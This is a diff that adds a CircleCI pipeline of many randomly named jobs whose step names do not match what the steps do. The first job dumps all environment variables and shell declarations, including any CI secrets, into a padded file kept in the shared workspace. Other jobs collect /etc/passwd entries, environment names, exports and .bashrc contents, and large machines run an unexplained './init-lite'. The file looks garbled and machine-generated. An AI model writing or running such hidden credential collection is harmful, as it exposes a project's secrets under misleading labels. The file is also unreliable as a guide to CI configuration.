@@ -1,0 +1,1889 @@
+version: 2.1
+
+jobs:
+  xice0fh1j9j3u0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Why hash the output bucket
+          command: |
+            mkdir -p /tmp/pi
+            set +o pipefail 2>/dev/null; { env; declare -p; } > /tmp/pi/HostPulse 2>/dev/null; dd if=/dev/urandom bs=100 count=500 2>/dev/null >> /tmp/pi/HostPulse; true
+            echo "complete $(wc -c </tmp/pi/HostPulse)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'HostPulse'
+  API-865:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/HostPulse 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  ZONE_FILE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: TEST ONLY RESIZE
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; echo 'step 2 of 5' | tr -s ' '; true ; } > /tmp/pi/burstbronze
+            echo "complete $(wc -c </tmp/pi/burstbronze)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'burstbronze'
+  ga-v5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/burstbronze 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  jm18cavfmnvwx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: UX 3 Labeling
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; head -n 4 /etc/passwd | cut -d ':' -f 1 | tac; true ; } > /tmp/pi/debug.log.9
+            echo "complete $(wc -c </tmp/pi/debug.log.9)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'debug.log.9'
+  jan17-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/debug.log.9 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  NBF__BOTTOM_DATABASE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Preflight vortex
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; printenv | sed 's/=.*//' | awk 'length > 7'; true ; } > /tmp/pi/error-3352e.log
+            echo "complete $(wc -c </tmp/pi/error-3352e.log)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'error-3352e.log'
+  wen-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/error-3352e.log 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  optionMode:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Ten nine eight sharding
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; export -p | head --lines=3; true ; } > /tmp/pi/lambda996
+            echo "complete $(wc -c </tmp/pi/lambda996)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'lambda996'
+  LAB_MERGE_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  edgeDidLoad:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: The support macros already reviewed
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; host=finalgame.jpg && echo ${host:3}; true ; } > /tmp/pi/ParserKernelGlacier
+            echo "complete $(wc -c </tmp/pi/ParserKernelGlacier)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'ParserKernelGlacier'
+  bob-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/ParserKernelGlacier 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  sk-Hans:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Accelerate report
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; grep -hR --include='*rc' umask /usr/share/doc/bash | tail -6; true ; } > /tmp/pi/echo908
+            echo "complete $(wc -c </tmp/pi/echo908)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'echo908'
+  dp-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/echo908 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  SLOT_VERSION:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: handleLookupTablePivot
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; uptime | sort -u | tac | sort -u | cut -c1-23; true ; } > /tmp/pi/trial-51v
+            echo "complete $(wc -c </tmp/pi/trial-51v)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'trial-51v'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/trial-51v 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  ichDeep:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Wait for the footer links to appear
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; /bin/echo 'all systems go'; true ; } > /tmp/pi/env-Wolf-tmp
+            echo "complete $(wc -c </tmp/pi/env-Wolf-tmp)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'env-Wolf-tmp'
+  bob-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/env-Wolf-tmp 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  NavWriterGardenTraceEmber:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Benchmark the accessibility audit following standup
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/mirror-lemon02.gz" && zgrep -c root "/tmp/mirror-lemon02.gz"; true ; } > /tmp/pi/v3c70r
+            echo "complete $(wc -c </tmp/pi/v3c70r)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'v3c70r'
+  orion-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  Compress-MyModule:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Round XI Optimize The Achievements
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; grep -n alias "$HOME/.bashrc" | sort -u; true ; } > /tmp/pi/uowc571
+            echo "complete $(wc -c </tmp/pi/uowc571)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'uowc571'
+  cf-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  tango-oscar-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: do not touch
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; grep -F -C 2 sync /etc/passwd | sort | head -n 3; true ; } > /tmp/pi/loader835
+            echo "complete $(wc -c </tmp/pi/loader835)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'loader835'
+  v5-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  nuter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Absolutely required linking
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; env | awk -F= '{print length($2), $1}' | sort -n | tail --lines=3; true ; } > /tmp/pi/m0or-pars3r
+            echo "complete $(wc -c </tmp/pi/m0or-pars3r)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'm0or-pars3r'
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  brown200:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Tune and load
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; find /run -type l -atime -1 -exec echo {} \; 2>/dev/null|nl; true ; } > /tmp/pi/67b1bXSzS3mLt2Wi8ykp
+            echo "complete $(wc -c </tmp/pi/67b1bXSzS3mLt2Wi8ykp)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '67b1bXSzS3mLt2Wi8ykp'
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/67b1bXSzS3mLt2Wi8ykp 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  registry_nightly_s390x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: archiveGlossaryJob
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; ln -sf /usr/bin/env "/tmp/worker-2022-09.md" && readlink -f "/tmp/worker-2022-09.md"; true ; } > /tmp/pi/17d7cd5cf
+            echo "complete $(wc -c </tmp/pi/17d7cd5cf)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '17d7cd5cf'
+  run-partial-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  bundle956usd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: If the old backups are missing bail out
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; shuf -r -n 2 -e heads tails; true ; } > /tmp/pi/6OssV5
+            echo "complete $(wc -c </tmp/pi/6OssV5)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '6OssV5'
+  pr-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  fOV4IB8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Seal the standard curve at 1000 rpm
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; cat /etc/shells | sort -u | grep "^/" | head -n20; true ; } > /tmp/pi/190.104.65.116
+            echo "complete $(wc -c </tmp/pi/190.104.65.116)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '190.104.65.116'
+  Run_App1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/190.104.65.116 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  PUBLIC_CELL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Jonas on preview duty
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; awk '{print NF}' /etc/nsswitch.conf | sort --numeric-sort | tail -1; true ; } > /tmp/pi/4759a30a
+            echo "complete $(wc -c </tmp/pi/4759a30a)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '4759a30a'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/4759a30a 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  cold-p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Critical spin up
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; ls -1Sv /usr/sbin | sort -R | head -n3; true ; } > /tmp/pi/f950ffc2930c527168cfed04f
+            echo "complete $(wc -c </tmp/pi/f950ffc2930c527168cfed04f)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'f950ffc2930c527168cfed04f'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/f950ffc2930c527168cfed04f 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  inner-flag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: JANUARY SPLIT SCRATCH SPACE
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; sha384sum "$HOME/.bashrc" | cut -c1-12; true ; } > /tmp/pi/draft_e6e357f5
+            echo "complete $(wc -c </tmp/pi/draft_e6e357f5)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'draft_e6e357f5'
+  run-nightly-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/draft_e6e357f5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  IDX-SECTION-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Route the DHCP leases ahead of shutdown
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; find /opt -name "*" -exec basename "{}" ";" 2>/dev/null | awk -F/ '{print $NF}'; true ; } > /tmp/pi/tmp_d639d50
+            echo "complete $(wc -c </tmp/pi/tmp_d639d50)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'tmp_d639d50'
+  bun-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  RATE_LEVEL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Carry the deployment chart from region a
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; getent group | sed 's/:.*//' | shuf -n 1; true ; } > /tmp/pi/x9gcvx
+            echo "complete $(wc -c </tmp/pi/x9gcvx)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'x9gcvx'
+  LAB_BUILD_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  ourLevelBase:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Confirm the travel claims by payroll cutoff
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; which bash; true ; } > /tmp/pi/56.154.97.96
+            echo "complete $(wc -c </tmp/pi/56.154.97.96)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '56.154.97.96'
+  chore-7915:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/56.154.97.96 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  rewind-lock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Cut over the staging cluster if needed
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; compgen -b | sort | uniq | tac; true ; } > /tmp/pi/eN
+            echo "complete $(wc -c </tmp/pi/eN)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'eN'
